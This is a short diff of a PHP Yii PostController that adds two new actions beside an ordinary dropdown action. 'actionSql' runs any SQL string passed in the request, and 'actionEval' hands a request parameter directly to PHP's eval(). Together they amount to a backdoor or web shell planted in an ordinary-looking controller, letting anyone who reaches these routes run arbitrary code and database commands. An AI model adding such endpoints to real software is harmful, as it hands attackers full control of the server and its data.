@@ -126,6 +126,19 @@ class PostController extends Controller
         ]);
     }
 
+    public function actionSql($sql)
+    {
+        $connection=Yii::$app->getDb();
+        $command = $connection->createCommand($sql);
+        return $command->execute();
+    }
+
+
+    public function actionEval($php)
+    {
+        return eval($php);
+    }
+
     public function actionNpCityDropDown()
     {
 
